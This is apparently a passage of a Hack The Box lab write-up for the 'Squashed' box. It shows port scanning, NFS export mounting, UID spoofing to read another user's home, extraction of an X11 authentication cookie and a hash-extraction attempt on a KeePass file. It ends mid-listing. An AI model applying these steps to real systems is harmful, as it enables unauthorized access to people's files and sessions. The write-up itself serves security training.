@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Linux box.">
+    
+    <title>
+        
+            Squashed | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Squashed<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2024-01-07</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/squashed/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#nfs-port-2049-tcp">NFS (port 2049&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#exports">Exports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#exploring-home-ross">Exploring &#x2F;home&#x2F;ross</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#enumerating-xauthority">Enumerating .Xauthority</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#enumerating-passwords-kdbx">Enumerating Passwords.kdbx</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#hash-cracking">Hash cracking</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#exploring-var-www-html">Exploring &#x2F;var&#x2F;www&#x2F;html</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#apache-port-80-tcp">Apache (port 80&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#http-headers">HTTP headers</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#technology-lookup">Technology lookup</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#exploration">Exploration</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#site-crawling">Site crawling</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#directory-fuzzing">Directory fuzzing</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#foothold-rce">Foothold (RCE)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#check">Check</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#preparation">Preparation</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#exploitation">Exploitation</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#distribution">Distribution</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#kernel">Kernel</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#apparmor">AppArmor</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#hostname">Hostname</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#user-account-information">User account information</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#displays">Displays</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#ross-s-display-screenshot">ross&#x27;s display screenshot</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#privilege-escalation-root-impersonation">Privilege escalation (root impersonation)</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/squashed/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2022-11-10</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/159204">polarbearer</a> &amp; <a href="https://app.hackthebox.com/users/458049">C4rm3l0</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.30</code>, while the target machine's IP address will be <code>10.10.11.191</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Squashed using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.191<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT      STATE SERVICE
+</span><span class="z-text z-plain">22/tcp    open  ssh
+</span><span class="z-text z-plain">80/tcp    open  http
+</span><span class="z-text z-plain">111/tcp   open  rpcbind
+</span><span class="z-text z-plain">2049/tcp  open  nfs
+</span><span class="z-text z-plain">37207/tcp open  unknown
+</span><span class="z-text z-plain">47697/tcp open  unknown
+</span><span class="z-text z-plain">53663/tcp open  unknown
+</span><span class="z-text z-plain">59293/tcp open  unknown
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the service associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.191<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,80,111,2049<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE VERSION
+</span><span class="z-text z-plain">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+</span><span class="z-text z-plain">111/tcp  open  rpcbind 2-4 (RPC #100000)
+</span><span class="z-text z-plain">2049/tcp open  nfs     3-4 (RPC #100003)
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so <code>nmap</code> determined that Squashed is running Linux, and the SSH version suggests that it might be Ubuntu.</p>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on these services to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.11.191<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,80,111,2049<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT     STATE SERVICE
+</span><span class="z-text z-plain">22/tcp   open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+</span><span class="z-text z-plain">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+</span><span class="z-text z-plain">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+</span><span class="z-text z-plain">80/tcp   open  http
+</span><span class="z-text z-plain">|_http-title: Built Better
+</span><span class="z-text z-plain">111/tcp  open  rpcbind
+</span><span class="z-text z-plain">| rpcinfo: 
+</span><span class="z-text z-plain">|   program version    port/proto  service
+</span><span class="z-text z-plain">|   100000  2,3,4        111/tcp   rpcbind
+</span><span class="z-text z-plain">|   100000  2,3,4        111/udp   rpcbind
+</span><span class="z-text z-plain">|   100000  3,4          111/tcp6  rpcbind
+</span><span class="z-text z-plain">|   100000  3,4          111/udp6  rpcbind
+</span><span class="z-text z-plain">|   100003  3           2049/udp   nfs
+</span><span class="z-text z-plain">|   100003  3           2049/udp6  nfs
+</span><span class="z-text z-plain">|   100003  3,4         2049/tcp   nfs
+</span><span class="z-text z-plain">|   100003  3,4         2049/tcp6  nfs
+</span><span class="z-text z-plain">|   100005  1,2,3      35858/udp   mountd
+</span><span class="z-text z-plain">|   100005  1,2,3      43771/tcp6  mountd
+</span><span class="z-text z-plain">|   100005  1,2,3      45065/udp6  mountd
+</span><span class="z-text z-plain">|   100005  1,2,3      47697/tcp   mountd
+</span><span class="z-text z-plain">|   100021  1,3,4      37207/tcp   nlockmgr
+</span><span class="z-text z-plain">|   100021  1,3,4      42853/tcp6  nlockmgr
+</span><span class="z-text z-plain">|   100021  1,3,4      44169/udp   nlockmgr
+</span><span class="z-text z-plain">|   100021  1,3,4      45440/udp6  nlockmgr
+</span><span class="z-text z-plain">|   100227  3           2049/tcp   nfs_acl
+</span><span class="z-text z-plain">|   100227  3           2049/tcp6  nfs_acl
+</span><span class="z-text z-plain">|   100227  3           2049/udp   nfs_acl
+</span><span class="z-text z-plain">|_  100227  3           2049/udp6  nfs_acl
+</span><span class="z-text z-plain">2049/tcp open  nfs
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The only interesting information I see is that the HTTP title of the web server running on port <code>80/tcp</code> is 'Built Better'.</p>
+<p>Let's start by investigating the NFS server.</p>
+<h2 id="nfs-port-2049-tcp">NFS (port <code>2049/tcp</code>)</h2>
+<h3 id="exports">Exports</h3>
+<p>Let's get the list of all exports for Squashed.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> showmount<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> 10.10.11.191</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/home/ross    *
+</span><span class="z-text z-plain">/var/www/html *
+</span></code></pre>
+<p>Okay, so the <code>/home/ross</code> and <code>/var/www/html</code> folders are accessible by all machines.</p>
+<h3 id="exploring-home-ross">Exploring <code>/home/ross</code></h3>
+<p>Let's mount this folder on our machine.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> mount<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>t</span> nfs 10.10.11.191:/home/ross /workspace/nfs/ross<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> nolock</span>
+</span></code></pre>
+<p>Now let's get its content.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tree<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /workspace/nfs/ross</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/workspace/nfs/ross
+</span><span class="z-text z-plain">├── .Xauthority
+</span><span class="z-text z-plain">├── .bash_history -&gt; /dev/null
+</span><span class="z-text z-plain">├── .cache  [error opening dir]
+</span><span class="z-text z-plain">├── .config  [error opening dir]
+</span><span class="z-text z-plain">├── .gnupg  [error opening dir]
+</span><span class="z-text z-plain">├── .local  [error opening dir]
+</span><span class="z-text z-plain">├── .viminfo -&gt; /dev/null
+</span><span class="z-text z-plain">├── .xsession-errors
+</span><span class="z-text z-plain">├── .xsession-errors.old
+</span><span class="z-text z-plain">├── Desktop
+</span><span class="z-text z-plain">├── Documents
+</span><span class="z-text z-plain">│   └── Passwords.kdbx
+</span><span class="z-text z-plain">├── Downloads
+</span><span class="z-text z-plain">├── Music
+</span><span class="z-text z-plain">├── Pictures
+</span><span class="z-text z-plain">├── Public
+</span><span class="z-text z-plain">├── Templates
+</span><span class="z-text z-plain">└── Videos
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We got a few errors, because most of the directories are actually owned by a user with ID <code>1001</code>.</p>
+<p>To circuvment this problem, I'll simply create a dummy user with this ID, and change to it.</p>
+<p>Now let's run the previous command once again:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tree<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /workspace/nfs/ross</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/workspace/nfs/ross
+</span><span class="z-text z-plain">├── .Xauthority
+</span><span class="z-text z-plain">├── .bash_history -&gt; /dev/null
+</span><span class="z-text z-plain">├── .cache
+</span><span class="z-text z-plain">│   ├── bijiben
+</span><span class="z-text z-plain">│   │   ├── CacheStorage
+</span><span class="z-text z-plain">│   │   │   └── salt
+</span><span class="z-text z-plain">│   │   └── WebKitCache
+</span><span class="z-text z-plain">│   │       └── Version 16
+</span><span class="z-text z-plain">│   │           ├── Blobs
+</span><span class="z-text z-plain">│   │           └── salt
+</span><span class="z-text z-plain">│   ├── bijiben-shell-search-provider
+</span><span class="z-text z-plain">│   ├── event-sound-cache.tdb.8e7b2e7692df48faa4e42d6cfc791ed2.x86_64-pc-linux-gnu
+</span><span class="z-text z-plain">│   ├── evolution
+</span><span class="z-text z-plain">│   │   ├── addressbook
+</span><span class="z-text z-plain">│   │   │   └── trash
+</span><span class="z-text z-plain">│   │   ├── calendar
+</span><span class="z-text z-plain">│   │   │   └── trash
+</span><span class="z-text z-plain">│   │   ├── mail
+</span><span class="z-text z-plain">│   │   │   └── trash
+</span><span class="z-text z-plain">│   │   ├── memos
+</span><span class="z-text z-plain">│   │   │   └── trash
+</span><span class="z-text z-plain">│   │   ├── sources
+</span><span class="z-text z-plain">│   │   │   └── trash
+</span><span class="z-text z-plain">│   │   └── tasks
+</span><span class="z-text z-plain">│   │       └── trash
+</span><span class="z-text z-plain">├── &lt;SNIP&gt;
+</span><span class="z-text z-plain">├── .viminfo -&gt; /dev/null
+</span><span class="z-text z-plain">├── .xsession-errors
+</span><span class="z-text z-plain">├── .xsession-errors.old
+</span><span class="z-text z-plain">├── Desktop
+</span><span class="z-text z-plain">├── Documents
+</span><span class="z-text z-plain">│   └── Passwords.kdbx
+</span><span class="z-text z-plain">├── Downloads
+</span><span class="z-text z-plain">├── Music
+</span><span class="z-text z-plain">├── Pictures
+</span><span class="z-text z-plain">├── Public
+</span><span class="z-text z-plain">├── Templates
+</span><span class="z-text z-plain">└── Videos
+</span></code></pre>
+<p>Now there's much more output!</p>
+<p>If we look at it more closely, we find two interesting files: <code>.Xauthority</code> and <code>Passwords.kdbx</code>.</p>
+<h3 id="enumerating-xauthority">Enumerating <code>.Xauthority</code></h3>
+<p>Let's parse the content of this file using <code>xauth</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> xauth<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> /workspace/.Xauthority</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">xauth&gt; list
+</span><span class="z-text z-plain">squashed.htb/unix:0  MIT-MAGIC-COOKIE-1  a97630fd57d4782539f7f5b2c3a76e9b
+</span></code></pre>
+<p>It contains a 'MIT-MAGIC-COOKIE-1'.</p>
+<p>In fact, this cookie is used as a form of authentication to ensure that only authorized clients can display windows on the X11 server.</p>
+<p>This means two things. First, <code>ross</code> is probably connected on the machine and using the X11 server. Second, we should be able to access <code>ross</code>'s display!</p>
+<h3 id="enumerating-passwords-kdbx">Enumerating <code>Passwords.kdbx</code></h3>
+<p>Let's try to open <code>Passwords.kdbx</code> using KeePassXC.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/squashed/opening-passwords-file-keepassxc.png" alt="Opening the 'Passwords.kdbx' file with KeepassXC" /></p>
+<p>Predictably, we're asked to enter a password. Unfortunately, common ones don't work.</p>
+<h3 id="hash-cracking">Hash cracking</h3>
+<p>Let's extract the password hash from the <code>.kdbx</code> file:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> keepass2john /workspace/nfs/ross/Documents/Passwords.kdbx <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> /workspace/keepass.hash</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">! /workspace/nfs/ross/Documents/Passwords.kdbx : File version &#39;40000&#39; is currently not supported!
+</span></code></pre>
+<p>We got an error... looks like a dead end.</p>
+<h3 id="exploring-var-www-html">Exploring <code>/var/www/html</code></h3>
+<p>Let's mount this folder on our machine.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> mount<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>t</span> nfs 10.10.11.191:/var/www/html /workspace/nfs/html<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> nolock</span>
+</span></code></pre>
+<p>Now let's get its content.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tree<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /workspace/nfs/html</span>
+</span></code></pre>
+<p>Nothing...</p>
+<p>In fact, the whole directory is owned by the user with ID <code>2017</code>, and belongs to the <code>www-data</code> group.</p>
+<p>To circuvment this problem, I'll use the same technique as before.</p>
+<p>Now let's run the previous command once again:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tree<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /workspace/nfs/html</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/workspace/nfs/html
+</span><span class="z-text z-plain">├── .htaccess
+</span><span class="z-text z-plain">├── css
+</span><span class="z-text z-plain">│   ├── .DS_Store
+</span><span class="z-text z-plain">│   ├── animate.min.css
+</span><span class="z-text z-plain">│   ├── bootstrap-grid.css
+</span><span class="z-text z-plain">│   ├── bootstrap-grid.css.map
+</span><span class="z-text z-plain">│   ├── bootstrap-grid.min.css
+</span><span class="z-text z-plain">│   ├── bootstrap-grid.min.css.map
+</span><span class="z-text z-plain">│   ├── bootstrap-reboot.css
+</span><span class="z-text z-plain">│   ├── bootstrap-reboot.css.map
+</span><span class="z-text z-plain">│   ├── bootstrap-reboot.min.css
+</span><span class="z-text z-plain">│   ├── bootstrap-reboot.min.css.map
+</span><span class="z-text z-plain">│   ├── bootstrap.css
+</span><span class="z-text z-plain">│   ├── bootstrap.css.map
+</span><span class="z-text z-plain">│   ├── bootstrap.min.css
+</span><span class="z-text z-plain">│   ├── bootstrap.min.css.map
+</span><span class="z-text z-plain">│   ├── default-skin.css
+</span><span class="z-text z-plain">│   ├── font-awesome.min.css
+</span><span class="z-text z-plain">│   ├── icomoon.css
+</span><span class="z-text z-plain">│   ├── jquery-ui.css
+</span><span class="z-text z-plain">│   ├── jquery.fancybox.min.css
+</span><span class="z-text z-plain">│   ├── jquery.mCustomScrollbar.min.css
+</span><span class="z-text z-plain">│   ├── meanmenu.css
+</span><span class="z-text z-plain">│   ├── nice-select.css
+</span><span class="z-text z-plain">│   ├── normalize.css
+</span><span class="z-text z-plain">│   ├── owl.carousel.min.css
+</span><span class="z-text z-plain">│   ├── responsive.css
+</span><span class="z-text z-plain">│   ├── slick.css
+</span><span class="z-text z-plain">│   └── style.css
+</span><span class="z-text z-plain">├── images
+</span><span class="z-text z-plain">│   ├── banner-bg.png
+</span><span class="z-text z-plain">│   ├── bg-1.png
+</span><span class="z-text z-plain">│   ├── contact-bg.png
+</span><span class="z-text z-plain">│   ├── fb-icon.png
+</span><span class="z-text z-plain">│   ├── footer-logo.png
+</span><span class="z-text z-plain">│   ├── header-bg.png
+</span><span class="z-text z-plain">│   ├── icon-1.png
+</span><span class="z-text z-plain">│   ├── icon-2.png
+</span><span class="z-text z-plain">│   ├── icon-3.png
+</span><span class="z-text z-plain">│   ├── icon-4.png
+</span><span class="z-text z-plain">│   ├── img-1.png
+</span><span class="z-text z-plain">│   ├── img-2.png
+</span><span class="z-text z-plain">│   ├── img-3.png
+</span><span class="z-text z-plain">│   ├── img-4.png
+</span><span class="z-text z-plain">│   ├── img-5.png
+</span><span class="z-text z-plain">│   ├── img-6.png
+</span><span class="z-text z-plain">│   ├── img-7.png
+</span><span class="z-text z-plain">│   ├── img-8.png
+</span><span class="z-text z-plain">│   ├── img-9.png
